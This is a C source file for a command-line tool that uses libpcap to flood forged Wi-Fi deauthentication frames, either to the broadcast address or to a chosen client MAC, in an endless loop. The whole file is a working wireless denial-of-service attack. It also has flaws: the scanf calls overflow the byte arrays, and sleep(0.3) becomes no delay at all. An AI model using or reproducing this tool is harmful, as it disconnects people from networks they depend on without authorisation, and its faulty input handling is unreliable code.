#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>
#include <stdbool.h>
#include <unistd.h>

void usage() {
	printf("syntax: WiFi_DeauthAttack -b or -u <interface>\n");
	printf("sample: WiFi_DeauthAttack -b or -u mon0\n");
}

typedef struct {
	char* dev_;
} Param;

Param param  = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc != 3) {
		usage();
		return false;
	}
	param->dev_ = argv[2];
	return true;
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;
	
	u_char IN_SMac[6];
    u_char IN_Target[6];
	
	u_char SMac[6];
	u_char Target[6];
	unsigned char u_packet[1024];


	printf("SRC Mac: ");
	scanf("%x:%x:%x:%x:%x:%x", &IN_SMac[0], &IN_SMac[1], &IN_SMac[2], &IN_SMac[3], &IN_SMac[4], &IN_SMac[5]);

	memcpy(SMac, &IN_SMac, sizeof(IN_SMac));
	unsigned char packet[1024] = {
			0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, 0xc0, 0x00, 0x3a, 0x01,
			0xff, 0xff, 0xff, 0xff, 0xff, 0xff, SMac[0], SMac[1], SMac[2], SMac[3], SMac[4], SMac[5], 0xec, 0x08, 0x6b, 0x37,
			0x4e, 0xa9, 0x30, 0x00, 0x07, 0x00
	};

	if(strcmp(argv[1], "-u") == 0){
		printf("TARGET Mac: ");
		scanf("%x:%x:%x:%x:%x:%x", &IN_Target[0], &IN_Target[1], &IN_Target[2], &IN_Target[3], &IN_Target[4], &IN_Target[5]);

		
		memcpy(Target, &IN_Target, sizeof(IN_Target));

		unsigned char tmp[1024] = {
			0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, 0xc0, 0x00, 0x3a, 0x01,
			Target[0], Target[1], Target[2], Target[3], Target[4], Target[5], SMac[0], SMac[1], SMac[2], SMac[3], SMac[4], SMac[5], 0xec, 0x08, 0x6b, 0x37,
			0x4e, 0xa9, 0x30, 0x00, 0x07, 0x00
		};
		memcpy(u_packet, &tmp, 38);
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
	while(true){
		if(strcmp(argv[1], "-u") == 0){
			printf("[*] Sent - { %02X:%02X:%02X:%02X:%02X:%02X } --> { %02X:%02X:%02X:%02X:%02X:%02X }\n",SMac[0], SMac[1], SMac[2], SMac[3], SMac[4], SMac[5], Target[0], Target[1], Target[2], Target[3], Target[4], Target[5]);
		}
		else{
			printf("[*] Sent - { %02X:%02X:%02X:%02X:%02X:%02X }\n",SMac[0], SMac[1], SMac[2], SMac[3], SMac[4], SMac[5]);  
		}
		if(strcmp(argv[1], "-u") == 0){
			if(pcap_sendpacket(pcap, u_packet, 38) != 0){
				printf("[-] Failed!\n");
			}
		}
		else{
			if(pcap_sendpacket(pcap, packet, 38) != 0){
				printf("[-] Failed!\n");
			}
		}
		sleep(0.3);
	}

    pcap_close(pcap);
}